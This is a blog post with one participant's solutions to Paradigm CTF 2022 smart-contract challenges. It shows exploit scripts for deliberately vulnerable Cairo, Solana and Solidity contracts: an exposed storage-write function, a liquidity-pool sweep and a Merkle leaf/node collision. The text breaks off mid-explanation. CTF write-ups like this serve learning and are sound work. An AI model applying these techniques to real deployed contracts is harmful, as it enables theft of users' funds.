<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="generator" content="Hugo 0.97.3" />

  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="author" content="Ivan Kuznetsov">
  <meta property="og:url" content="https://jeiwan.net/posts/my-paradigm-ctf-solutions/">

  <title>My Paradigm CTF 2022 Solutions - Going the distance</title>
  <meta property="og:title" content="My Paradigm CTF 2022 Solutions - Going the distance">
  <meta property="og:type" content="article">
  <meta name="description" content="A blog about blockchains and smart contracts development">
  <meta name="keywords" content="bitcoin, ethereum, evm, smart contract, blockchain, programming, development, solidity, vyper">

  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro|Arvo:400,700">
  <link rel="stylesheet" href="/css/prism.css">
  <link rel="stylesheet" href="/css/journal.css">
  <link href="/index.xml" rel="alternate" type="application/rss+xml" title="Going the distance">

  

  

</head>

<body>
  <div class="container">

    <nav class="site-nav">
      <a href="https://jeiwan.net">Index</a>
    </nav>


  <article class="post">
    <header class="post-header">
      <h1 class="post-title">My Paradigm CTF 2022 Solutions</h1>
      <time class="post-date" datetime="2022-08-22 00:00:00 &#43;0000">22 Aug 2022</time>
    </header>

    <p><img src="/images/paradigm-2022-results.png" alt="My Paradigm CTF 2022 Results"></p>
<p>Paradigm CTF is an online competition for smart contract hackers organized by <a href="https://paradigm.xyz">Paradigm</a>, an
investment fund that supports Web3 and crypto companies. The competition consists of multiple challenges created by
brightest minds of the field. The goal in each challenge is to hack a smart contract or to find another, absolutely non-
obvious, way of solving it.</p>
<p>This year, the CTF had 23 challenges. I solved 7 of them, got 1,379 points, and ended up 38th out of ~100.</p>
<p>Solved challenges:</p>
<ul>
<li>Random</li>
<li>Riddle-of-the-Sphinx</li>
<li>Otter-world</li>
<li>Cairo-proxy</li>
<li>Rescue</li>
<li>Merkledrop</li>
<li>Vanity</li>
</ul>
<h2 id="sanity-checks">Sanity Checks</h2>
<p>This year, there were challenges for different platforms: EVM, Solana, Cairo. Each of the platforms had multiple
challenges with different difficulty levels. The easiest ones were tagged &ldquo;sanity check&rdquo;</p>
<h3 id="random">Random</h3>
<blockquote>
<p>I&rsquo;m thinking of a number between 4 and 4</p>
</blockquote>
<p>The entry-level EVM challenge. You needed to call <code>solve</code> with a &ldquo;random&rdquo; number generated by a contract. The number
was 4.</p>
<h3 id="riddle-of-the-sphinx">Riddle-of-the-Sphinx</h3>
<blockquote>
<p>What walks on four legs in the morning, two legs in the afternoon, three legs in the evening, and no legs at night?</p>
</blockquote>
<p>The entry-level Cairo challenge. You needed to find the answer to the riddle in the description and set it in a contract.
The challenge contract had a storage variable and a setter for it, so you just needed to call the setter and pass the
correct answer.</p>
<p>The challenge contract:</p>
<pre tabindex="0"><code class="language-cairo" data-lang="cairo">%lang starknet

from starkware.cairo.common.cairo_builtins import HashBuiltin

@storage_var
func _solution() -&gt; (res : felt):
end

@external
func solve{
    syscall_ptr : felt*,
    pedersen_ptr : HashBuiltin*,
    range_check_ptr,
}(solution : felt):
    _solution.write(solution)
    return ()
end

@view
func solution{
    syscall_ptr : felt*,
    pedersen_ptr : HashBuiltin*,
    range_check_ptr,
}() -&gt; (solution : felt):
    let (solution) = _solution.read()
    return (solution)
end
</code></pre><p>My solution in Python using <a href="https://github.com/software-mansion/starknet.py">starknet.py</a>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">starknet_py.net</span> <span class="kn">import</span> <span class="n">AccountClient</span><span class="p">,</span> <span class="n">KeyPair</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">starknet_py.net.gateway_client</span> <span class="kn">import</span> <span class="n">GatewayClient</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">starknet_py.net.networks</span> <span class="kn">import</span> <span class="n">TESTNET</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">starknet_py.contract</span> <span class="kn">import</span> <span class="n">Contract</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">starknet_py.net.models.chains</span> <span class="kn">import</span> <span class="n">StarknetChainId</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">starkware.crypto.signature.signature</span> <span class="kn">import</span> <span class="n">private_to_stark_key</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">starkware.starknet.core.os.contract_address.contract_address</span> <span class="kn">import</span> <span class="n">calculate_contract_address_from_hash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">prvkey</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pubkey</span><span class="o">=</span><span class="n">private_to_stark_key</span><span class="p">(</span><span class="n">prvkey</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pair</span><span class="o">=</span><span class="n">KeyPair</span><span class="p">(</span><span class="n">private_key</span><span class="o">=</span><span class="n">prvkey</span><span class="p">,</span> <span class="n">public_key</span><span class="o">=</span><span class="n">pubkey</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">addr</span><span class="o">=</span><span class="n">calculate_contract_address_from_hash</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">salt</span><span class="o">=</span><span class="mi">20</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">class_hash</span><span class="o">=</span><span class="mi">1803505466663265559571280894381905521939782500874858933595227108099796801620</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">constructor_calldata</span><span class="o">=</span><span class="p">[</span><span class="n">pubkey</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="n">deployer_address</span><span class="o">=</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">client</span> <span class="o">=</span> <span class="n">GatewayClient</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">TESTNET</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">acc</span> <span class="o">=</span> <span class="n">AccountClient</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">client</span><span class="o">=</span><span class="n">client</span><span class="p">,</span> <span class="n">key_pair</span><span class="o">=</span><span class="n">pair</span><span class="p">,</span> <span class="n">chain</span><span class="o">=</span><span class="n">StarknetChainId</span><span class="o">.</span><span class="n">TESTNET</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="n">Contract</span><span class="o">.</span><span class="n">from_address_sync</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">acc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">functions</span><span class="p">[</span><span class="s2">&#34;solution&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">call_sync</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">.</span><span class="n">functions</span><span class="p">[</span><span class="s2">&#34;solve&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">invoke_sync</span><span class="p">(</span><span class="s2">&#34;man&#34;</span><span class="p">,</span> <span class="n">max_fee</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">functions</span><span class="p">[</span><span class="s2">&#34;solution&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">call_sync</span><span class="p">())</span>
</span></span></code></pre></div><p>The right answer could be found in one of the files provided with the challenge.</p>
<h3 id="otter-world">Otter-world</h3>
<blockquote>
<p>Otter World!</p>
</blockquote>
<p>This is the sanity check level for Solana. The challenge consisted of two Solana programs: &ldquo;challenge&rdquo; and &ldquo;solve&rdquo;. The
former was the actual challenge and the latter was used to solve it. The challenge program was a one-function program
that required a certain input value, which was just <code>0x1337 * 0x7331</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="cp">#[program]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">mod</span> <span class="nn">chall</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">use</span><span class="w"> </span><span class="k">super</span>::<span class="o">*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">get_flag</span><span class="p">(</span><span class="n">_ctx</span>: <span class="nc">Context</span><span class="o">&lt;</span><span class="n">GetFlag</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="n">magic</span>: <span class="kt">u64</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="p">()</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="fm">assert!</span><span class="p">(</span><span class="n">magic</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x1337</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x7331</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nb">Ok</span><span class="p">(())</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>So to solve the challenge I only needed to update the &ldquo;solve&rdquo; program to send the correct input:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="n">chall</span>::<span class="n">cpi</span>::<span class="n">get_flag</span><span class="p">(</span><span class="n">cpi_ctx</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8a56287</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></div><h2 id="cairo-proxy">Cairo-Proxy</h2>
<blockquote>
<p>Just a simple proxy contract</p>
</blockquote>
<p>This is the level 2 challenge in Cairo. It implement the classic Proxy pattern from Solidity/EVM: there&rsquo;s a facade
contract that stores data and that uses implementation from another contract. The implementation contract is an
ERC20-like contract that had some amount of tokens minted (50,000e18) and distributed to non user owner addresses (1337
and 7331). The goal was to get 50,000e18 of tokens on your balance.</p>
<p>At first, I noticed that the ERC20 was deployed, which is not required in Cairo: you shouldn&rsquo;t deploy implementation
contracts in Cairo and should instead use contract&rsquo;s &ldquo;class hash&rdquo;. The <a href="https://docs.openzeppelin.com/contracts-cairo/0.3.1/proxies">OpenZeppelin Cairo documentation</a>
was very helpful to figure this out. So, I called <code>initialize</code> on the ERC20 contract but this didn&rsquo;t for an obvious
reason: the two contracts use different data storages. We needed to have 50,000e18 tokens in the proxy contracts.</p>
<p>While scanning the source code, I noticed this piece in the proxy contract:</p>
<pre tabindex="0"><code class="language-cairo" data-lang="cairo">from utils import auth_read_storage
...
# Allow owner to read all the contract&#39;s state
@view
func read_state{
        syscall_ptr : felt*,
        pedersen_ptr : HashBuiltin*,
        range_check_ptr
    }(address : felt) -&gt; (value : felt):
    let (owner_account) = owner.read()
    let (value) = auth_read_storage(owner_account, address)
    return (value)
end
</code></pre><p>It imported a function from another file and used this function in a <code>view</code> method of the contract. In the utils file
I saw this:</p>
<pre tabindex="0"><code class="language-cairo" data-lang="cairo"># Helpers for auth users to interact with contract&#39;s storage 
@view
func auth_read_storage{
        syscall_ptr : felt*,
    }(auth_account : felt, address : felt) -&gt; (value : felt):
    let (caller) = get_caller_address()

    assert caller = auth_account

    let (value) = storage_read(address=address)

    return (value=value)
end

@external
func auth_write_storage{
        syscall_ptr : felt*,
    }(auth_account : felt, address : felt, value : felt):
    let (caller) = get_caller_address()

    assert caller = auth_account

    storage_write(address=address, value=value)
    return()
end
</code></pre><p>A-ha! So there&rsquo;s also a write-to-storage function. It has <code>@external</code> decorator, which makes it a public method of a
contract. However, it wasn&rsquo;t used in the proxy contract. Or was it?</p>
<p>To dispel my doubts I called this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">proxy_contract</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">abi</span><span class="p">)</span>
</span></span></code></pre></div><p>And saw that <code>auth_write_storage</code> was part of the proxy contract! So, I needed to write 50,000e18 to my storage slot in
the <code>balances</code> mapping:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">storage_addr</span><span class="o">=</span><span class="n">get_storage_var_address</span><span class="p">(</span><span class="s2">&#34;balances&#34;</span><span class="p">,</span> <span class="n">acc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">proxy_contract</span><span class="o">.</span><span class="n">functions</span><span class="p">[</span><span class="s2">&#34;auth_write_storage&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">invoke_sync</span><span class="p">(</span><span class="n">acc</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="n">storage_addr</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="mf">50000e18</span><span class="p">),</span> <span class="n">max_fee</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></div><h2 id="rescue">Rescue</h2>
<blockquote>
<p>I accidentally sent some WETH to a contract, can you help me?</p>
</blockquote>
<p>This is a classic DeFi challenge, where you need to move the DeFi Legos around to achieve a goal.</p>
<p>Someone sent some WETH to a contract and you need to find a way how to move them away from the contract. Luckily, the
contract provides a way:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">_addLiquidity</span><span class="p">(</span><span class="kt">address</span> <span class="n">token0</span><span class="p">,</span> <span class="kt">address</span> <span class="n">token1</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">minAmountOut</span><span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">(,,</span> <span class="kt">uint256</span> <span class="n">amountOut</span><span class="p">)</span> <span class="o">=</span> <span class="n">router</span><span class="p">.</span><span class="n">addLiquidity</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">token0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="n">token1</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="n">ERC20Like</span><span class="p">(</span><span class="n">token0</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span> 
</span></span><span class="line"><span class="cl">        <span class="n">ERC20Like</span><span class="p">(</span><span class="n">token1</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span> 
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">amountOut</span> <span class="o">&gt;=</span> <span class="n">minAmountOut</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>You can trigger it to provide liquidity to a Uniswap V2 pool. This is the goal, and you need to find the series of steps
that gets you there. In other words, you need to know what&rsquo;s required to add liquidity to a Uniswap V2 pool.</p>
<p>The steps I discovered:</p>
<ol>
<li>Buy 10 ether worth of USDC and send them to <code>MasterChefHelper</code>. We need exactly this amount because, when providing
liquidity in Uniswap, the proportion of tokens must be 50/50. In my case, thats 10 WETH and an equal amount of USDC.</li>
<li>Buy some amount of USDT. We need it to trigger <code>swapTokenForPoolToken</code> in <code>MasterChefHelper</code>. The function takes
our USDT, splits them, buys equal amount of WETH and USDC (I used <code>poolId</code> 1), and adds them as liquidity to a Uniswap
pool.</li>
<li>When <code>MasterChefHelper</code> calls <code>router.addLiquidity</code>, it tells the pool to take all its tokens, including the initial
10 WETH and our USDC.</li>
<li>Done!</li>
</ol>
<p>My solution:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">RescueSolve</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">UniswapV2RouterLike</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">router</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">        <span class="n">UniswapV2RouterLike</span><span class="p">(</span><span class="mh">0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">WETH9</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">weth</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">        <span class="n">WETH9</span><span class="p">(</span><span class="mh">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ERC20Like</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">usdc</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">        <span class="n">ERC20Like</span><span class="p">(</span><span class="mh">0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ERC20Like</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">usdt</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">        <span class="n">ERC20Like</span><span class="p">(</span><span class="mh">0xdAC17F958D2ee523a2206206994597C13D831ec7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">IPair</span> <span class="k">constant</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">IPair</span><span class="p">(</span><span class="mh">0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc</span><span class="p">);</span> <span class="c1">// USDC-WETH
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">IPair</span> <span class="k">constant</span> <span class="n">pair2</span> <span class="o">=</span> <span class="n">IPair</span><span class="p">(</span><span class="mh">0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852</span><span class="p">);</span> <span class="c1">// USDT-WETH
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">solve</span><span class="p">(</span><span class="kt">address</span> <span class="n">mcHelper</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">uint112</span> <span class="n">reserveUSDC</span><span class="p">,</span> <span class="kt">uint112</span> <span class="n">reserveWETH</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">pair</span><span class="p">.</span><span class="n">getReserves</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">usdcAmount</span> <span class="o">=</span> <span class="n">router</span><span class="p">.</span><span class="n">getAmountOut</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="mi">10</span> <span class="kc">ether</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">reserveWETH</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">reserveUSDC</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">weth</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">}();</span>
</span></span><span class="line"><span class="cl">        <span class="n">weth</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pair</span><span class="p">),</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">pair</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="n">usdcAmount</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">mcHelper</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">uint112</span> <span class="n">reserveWETH2</span><span class="p">,</span> <span class="kt">uint112</span> <span class="n">reserveUSDT</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">pair2</span><span class="p">.</span><span class="n">getReserves</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">usdtAmount</span> <span class="o">=</span> <span class="n">router</span><span class="p">.</span><span class="n">getAmountOut</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="mi">1</span> <span class="kc">ether</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">reserveWETH2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">reserveUSDT</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">weth</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
</span></span><span class="line"><span class="cl">        <span class="n">weth</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pair2</span><span class="p">),</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">pair2</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">usdtAmount</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">usdt</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="n">mcHelper</span><span class="p">,</span> <span class="n">usdt</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">        <span class="n">IMCHelper</span><span class="p">(</span><span class="n">mcHelper</span><span class="p">).</span><span class="n">swapTokenForPoolToken</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="n">usdt</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">usdt</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">            <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h2 id="merkledrop">Merkledrop</h2>
<blockquote>
<p>Were you whitelisted?</p>
</blockquote>
<p>Merkledrop is a popular technique of airdropping tokens. It requires building a <a href="https://en.wikipedia.org/wiki/Merkle_tree">Merkle tree</a>
where leaves store information about user addresses and amounts of tokens they&rsquo;re eligible for. Leaves are then grouped
in pairs and hashed. Their hashes are grouped in pairs and hashed again, and so on until there&rsquo;s one root hash.
Such a tree can be disclosed to anyone, and still there&rsquo;s no risk of modifying its data: the consistency is guaranteed
by hashing. It&rsquo;s also easy to prove that you&rsquo;re eligible for an airdrop:</p>
<ol>
<li>There needs to be a leaf with your address and amount.</li>
<li>You need to provide the path from your leaf to the root hash. Specifically, you&rsquo;ll need to proved the other hashes
in each of the pairs on each level of the tree.</li>
</ol>
<p>In this challenge, you get:</p>
<ol>
<li><code>MerkleDistributor</code> contract that handles the claiming logic: it takes index, account, amount, and an array of proofs
from users, verifies them, keeps record of claimed tokens (indexes), and releases tokens. A drop can be claimed only
once.</li>
<li><code>MerkleProof</code> contract that actually verifies proofs.</li>
<li><code>tree.json</code> with a Merkle tree containing 64 leaves (tuples of: index, account, amount, and proof array).</li>
</ol>
<p>The goal is to claim all the tokens (75,000e18) and have some of the leaves unclaimed. And it doesn&rsquo;t seem like an
achievable goal, after scanning the code and claiming the whole tree. Merkle trees are almost not hackable and the
contracts look absolutely solid: exact same contracts were used by many projects, like Uniswap and 1Inch. However,
there was a small change:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// MerkleDistributor
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nf">claim</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">index</span><span class="p">,</span> <span class="kt">address</span> <span class="n">account</span><span class="p">,</span> <span class="kt">uint96</span> <span class="n">amount</span><span class="p">,</span> <span class="kt">bytes32</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">merkleProof</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bytes32</span> <span class="n">node</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">account</span><span class="p">,</span> <span class="n">amount</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><code>amount</code> is <code>uint96</code>. So what?</p>
<p>When getting <code>node</code>: <code>index</code> is <code>uint256</code>, <code>account</code> is <code>address</code>, <code>amount</code> is <code>uint96</code>. This makes 64 bytes, and 64 is
a good number. If we look in <code>MerkleProof</code> again:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// MerkleProof
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="n">computedHash</span> <span class="o">&lt;</span> <span class="n">proofElement</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Hash(current computed hash + current element of the proof)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">computedHash</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">computedHash</span><span class="p">,</span> <span class="n">proofElement</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Hash(current element of the proof + current computed hash)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">computedHash</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">proofElement</span><span class="p">,</span> <span class="n">computedHash</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>It concatenates two hashes (each is 32 bytes) and hashes them. So inputs to <code>keccak256</code> here are also 64 bytes long.</p>
<p>What if&hellip; No, just what if one of the leaves is a&hellip; hash?</p>
<p>I took all the leaves and packed them like they&rsquo;re packed with <code>abi.encodePacked</code> before hashing in <code>claim</code> function:</p>
<p><img src="/images/paradigm-2022-merkledrop.png" alt="Merkledrop leaves packed"></p>
<p>Imagine that each of these sequences is what&rsquo;s hashed in <code>MerkleProof</code>, i.e. left 32 bytes is one hash and right 32 bytes
is another. However, hashes with many leading zeros are almost impossible and they don&rsquo;t look like real hashes. The right
32 bytes look more like hashes. Also notice that each of them has multiple 00 bytes in about the same positionâ€“this is
due to <code>uint96</code> amounts being padded. What if there&rsquo;s a proof in <code>tree.json</code> that has a similar padding?</p>
<p>Leaf 37 has this proof:</p>
